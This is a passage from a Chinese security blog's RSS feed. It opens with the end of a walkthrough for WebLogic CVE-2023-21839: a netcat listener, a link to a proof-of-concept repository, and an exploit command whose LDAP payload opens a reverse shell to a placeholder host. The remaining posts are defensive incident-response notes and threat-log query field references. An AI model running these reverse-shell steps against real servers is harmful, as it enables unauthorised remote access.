 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 6789&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取 poc&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/4ra1n/CVE-2023-21839&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 这个需要自行编译一下。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;反弹 shell&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CVE-2023-21839.exe -ip xx.xx.xx.xx -port 7001 -ldap ldap://xx.xx.xx.xx:1389/Basic/ReverseShell/xx.xx.xx.xx/6789&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2023/05/01/cybersecurity/hvv-3/</guid>
            <title>应急响应基础知识</title>
            <link>http://ericcd.com/2023/05/01/cybersecurity/hvv-3/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Mon, 01 May 2023 14:26:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;应急响应基础知识总结&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;实战下的应急响应&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实战下的应急响应&#34;&gt;#&lt;/a&gt; 实战下的应急响应&lt;/h1&gt;
&lt;h2 id=&#34;web-攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-攻击&#34;&gt;#&lt;/a&gt; web 攻击&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;相关表现：页面被篡改，恶意推广，黑词黑页，webshell。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相关危害：导致搜索引擎告警、微信等 app 分享告警、首页敏感内容、脱库、内网沦陷等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查要点：能否多个环境下复现异常；确认相关资产是否存在；而已文件是否存在于服务器上。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;操作要点：备份文件，webshell 后门查杀，web 日志分析，web 中间件缓存处理，web 中间件配置检查，重启 web 中间件，服务器后门检查。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;防护措施：加固相关 web 应用，修改相关系统的所有用户密码。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;链路劫持&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#链路劫持&#34;&gt;#&lt;/a&gt; 链路劫持&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;相关表现：区域性服务不可用或返回错误内容。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相关危害：导致搜索引擎告警、微信等 app 分享告警、首页敏感内容等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查要点：能否在多个环境下复现异常，确定相关资产是否存在，恶意文件是否确实存在于服务器上。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;操作要点：跨地区、运营商进行测试，确定受影响范围，在能复现的环境中判断是 DNS 劫持还是 HTTP 劫持。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;防护措施：重要业务部署 https。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;代理隧道&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代理隧道&#34;&gt;#&lt;/a&gt; 代理隧道&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;相关表现：持续性或间接性外连行为，通常为 tcp 协议，对内网多个主机有访问行为。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相关危害：作为跳板机攻击其它内网资产。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查要点：确定存在代理隧道的跳板机，通常为某时间段内集中访问内网多种资源的机器，判断隧道类型。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;防护措施：完善内网 acl，服务器按业务需要通过白名单策略访问外网。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;替换系统命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#替换系统命令&#34;&gt;#&lt;/a&gt; 替换系统命令&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;相关表现：无明显表现。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相关危害：将后门、木马持久化在系统中，窃取账号、密码等重要凭证。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查要点：使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;操作要点：使用静态链接的 busybox，重新安装被替换的包。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;命令：rpm -Va； dpkg --verify&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ldsopreload-动态链接库劫持&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ldsopreload-动态链接库劫持&#34;&gt;#&lt;/a&gt; ld.so.preload 动态链接库劫持&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;相关表现：无明显表现&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相关危害：将后门、木马持久化在系统中；窃取账号、密码等重要凭证。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查要点：检查 /etc/ld,so.preload，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xkLnNv&#34;&gt;ld.so&lt;/span&gt; (如 /lib/x86_64-linux-gnu/ld-2,&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzI3LnNv&#34;&gt;27.so&lt;/span&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;操作要点：使用静态链接的 busybox；重启被注入恶意模块的进程，必要时直接重启系统。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;内核态-rootkit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内核态-rootkit&#34;&gt;#&lt;/a&gt; 内核态 rootkit&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;相关表现：无明显表现。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相关危害：将后门、木马持久化在系统中；隐藏文件、进程等信息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查要点：确定是否存在无法使用常规命令查看的文件或进程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;操作要点：使用 tyton 内核态 rootkit 检测工具检测，检查 /etc/modules 是否有未知的内核模块。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;计划任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计划任务&#34;&gt;#&lt;/a&gt; 计划任务&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;相关表现：特定时间触发木马、后门、网络链接、DNS 请求、篡改页面等等行为。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相关危害：将后门、木马持久化在系统中，周期性篡改页面、拉取数据等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查要点：判断是否存在周期性出现的异常现象，检查 /var/spool/cron/crontabs/，/etc/cron.* 等常用计划任务配置文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;操作要点：停止计划任务后再操作，注意辨别利用 \r 回车符的障眼法小技巧。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;远控木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远控木马&#34;&gt;#&lt;/a&gt; 远控木马&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;相关表现：有持续性或间断性的对外网络链接或 DNS 请求等通信行为。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相关危害：窃取系统资料，作为跳板进一步攻击内网其它机器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查要点：关注 tcp、udp、icmp 等一切网络行为，检查注册表、服务、开机目录、计划任务等一些列常见的持久化点。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;操作要点：检查网络连接，以及 IDS 设备上的异常远控告警。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2023/05/01/cybersecurity/hvv-4/</guid>
            <title>应急响应基础知识</title>
            <link>http://ericcd.com/2023/05/01/cybersecurity/hvv-4/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Mon, 01 May 2023 14:26:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;应急响应基础流程&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;linux&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux&#34;&gt;#&lt;/a&gt; Linux&lt;/h1&gt;
&lt;h2 id=&#34;关键目录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键目录&#34;&gt;#&lt;/a&gt; 关键目录&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/passwd              用户信息文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/crontab             定时任务文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/anacrontab          异步定时文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/rc.d/rc.local       开机启动项 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/btmp            登录失败日志，使用 lastb 查看 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/cron            定时任务执行日志 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/lastlog         所有用户登录信息，使用 lastlog 查看 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/secure          验证、授权等日志 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/wtmp            包含用户登录日志，使用 last 命令查看 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/log/utmp            当前登陆系统的用户信息，使用 last 查看 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用命令&#34;&gt;#&lt;/a&gt; 常用命令&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;检查异常别名：alias&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查计划任务：&lt;br /&gt;
cat /var/spool/cron/crontabs/*&lt;br /&gt;
crontab -l&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看创建时间：stat&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查网络连接：netstat -antpl&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查后门账号：cat /etc/passwd&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查进程：top, ps -aux&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 gpu：nvidia-smi&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;根据 pid 查看对应可执行程序： ls -alh /proc/pid&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;开放端口进程： lsof -i:5678&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看历史命令：history，cat ~/.bash_history&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看当前目录下所有文件并排序：ls -alt&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;校验 RPM 软件包：rpm -Va，dpkg -verify&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看系统服务：service --status-all&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;windows&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows&#34;&gt;#&lt;/a&gt; Windows&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;查看系统进程：tasklist&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看网络情况：netstat -ant&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看计划任务：任务计划程序&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;任务管理器查看进程和服务&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查注册表&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;安全工具检测&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2023/04/30/cybersecurity/hvv-sky/</guid>
            <title>天眼学习</title>
            <link>http://ericcd.com/2023/04/30/cybersecurity/hvv-sky/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Sun, 30 Apr 2023 14:26:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;天眼相关知识总结&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;常见协议字段与语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见协议字段与语法&#34;&gt;#&lt;/a&gt; 常见协议字段与语法&lt;/h1&gt;
&lt;h2 id=&#34;天眼日志检索语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#天眼日志检索语法&#34;&gt;#&lt;/a&gt; 天眼日志检索语法&lt;/h2&gt;
&lt;p&gt;1 基本语法：&lt;br /&gt;
字段 ： 项 运算符 字段 ： 项&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;通配符查询&lt;br /&gt;
？ 和 * 的区别&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;范围查询&lt;br /&gt;
 [&amp;quot;192.168.00&amp;quot; TO &amp;quot;192.168.255.255&amp;quot;]&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;协议字段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议字段&#34;&gt;#&lt;/a&gt; 协议字段&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;威胁告警搜索字段&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;attack_sip          攻击者 ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alarm_sip           受害者 ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;attack_type         攻击类型 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;is_web_attack       用于标记告警是否为 web 告警 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_hazard_level       威胁级别 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络协议公共字段&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;access_time 日志生成时间 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 采集器采集到该数据包并解析完成生成日志的时间戳 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@timestamp 时间戳 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 日志在分析平台存储入库时添加 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sip 源 ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络数据流发起的 ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sport 源端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络数据流的客户端应用入口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dip 目的 ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络数据流的服务端 ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dport 目的端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络数据流的服务端应用端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;geo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip 对应的物理地址 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;3.TCP&amp;amp;UDP 协议字段&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proto 协议 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip 包头中的协议字段值 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uplink_length 上行字节数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 从 TCP 流的建立到该流的结束，从客户端发往服务器端的应用层字节总数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;downlink_length 下行字节数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 从 TCP 流建立到结束，从服务器端发往客户端的应用层数据的字节总数 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;src_mac 源 mac&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp 数据流的源 mac 地址 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dst_mac 目的 mac&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcp 数据流的目的 mac 地址 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;up_payload 上行前 100 字节 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 从 tcp 流建立起，从客户端发往服务器端应用层的前 100 个字节 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;down_payoad 下行前 100 字节 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 从 tcp 流建立起，从服务器端发往客户端应用层的前 100 个字节 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
3.HTTP 协议字段&lt;br /&gt;
 xff：请求端真实 ip 和代理&lt;/p&gt;
&lt;p&gt;4.HTTP 状态码&lt;br /&gt;
 100：continue；继续。客户端应继续其请求。&lt;br /&gt;
302：Found；临时移动，与 301 类似，但资源只是临时移动，客户端应继续使用原有 URL&lt;br /&gt;
400：Bad Request；客户端请求的语法错误，服务器无法理解。&lt;br /&gt;
401：Unauthorized；请求要求用户的身份认证。&lt;br /&gt;
402：Payment Required；保留，将来使用。&lt;br /&gt;
405：Method Not Allowed；客户端请求中的方法被静止。&lt;br /&gt;
500：Internal Server Error；服务器内部错误，无法完成请求。&lt;br /&gt;
502：Bad Gateway；作为网关或者代理工作的服务器尝试请求时，从远程服务器接收到一个无效响应。&lt;/p&gt;
&lt;p&gt;4.DNS 协议字段：&lt;br /&gt;
